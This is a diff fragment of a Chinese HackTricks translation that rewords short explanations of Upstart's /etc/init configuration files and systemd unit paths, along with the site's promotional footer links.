-`/etc/init` 包含了 **Upstart** 使用的 **配置文件**。Upstart 是由 Ubuntu 支持的一种年轻的服务管理包。`/etc/init` 中的文件是配置文件，告诉 Upstart 如何以及何时 `start`、`stop`、`reload` 配置，或查询服务的 `status`。从 lucid 开始，Ubuntu 正在从 SysVinit 迁移到 Upstart，这就解释了为什么许多服务都带有 SysVinit 脚本，尽管 Upstart 配置文件更受欢迎。SysVinit 脚本由 Upstart 中的兼容性层处理（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。
+`/etc/init` 包含了 Upstart 使用的**配置文件**。Upstart 是由 Ubuntu 支持的一种年轻的服务管理包。`/etc/init` 中的文件是配置文件，告诉 Upstart 如何以及何时 `start`、`stop`、`reload` 配置或查询服务的 `status`。从 lucid 开始，Ubuntu 正在从 SysVinit 迁移到 Upstart，这就解释了为什么许多服务附带 SysVinit 脚本，尽管 Upstart 配置文件更受欢迎。SysVinit 脚本由 Upstart 中的兼容性层处理（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。
 
-**systemd** 是一个 **Linux 初始化系统和服务管理器**，包括按需启动守护进程、挂载和自动挂载点维护、快照支持以及使用 Linux 控制组跟踪进程。systemd 提供了一个日志守护进程和其他工具和实用程序，以帮助完成常见的系统管理任务（来自[这里](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。
+**systemd** 是一个 Linux 初始化系统和服务管理器，包括按需启动守护进程、挂载和自动挂载点维护、快照支持以及使用 Linux 控制组跟踪进程。systemd 提供了一个日志守护进程和其他工具和实用程序，以帮助完成常见的系统管理任务（来自[这里](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。
 
 从发行版仓库下载的软件包中的文件放在 `/usr/lib/systemd/` 中。系统管理员（用户）进行的修改放在 `/etc/systemd/system/` 中。
 
@@ -1849,10 +1910,10 @@ DEVICE=eth0
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者想要获取**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中宣传你的**公司**吗？或者想要获取**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)。
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)。
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)，或者**关注**我的**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)。
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**Telegram群组**](https://t.me/peass)，或者**关注**我的**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 通过向[**hacktricks repo**](https://github.com/carlospolop/hacktricks)和[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)提交PR来**分享你的黑客技巧**。
 
 </details>
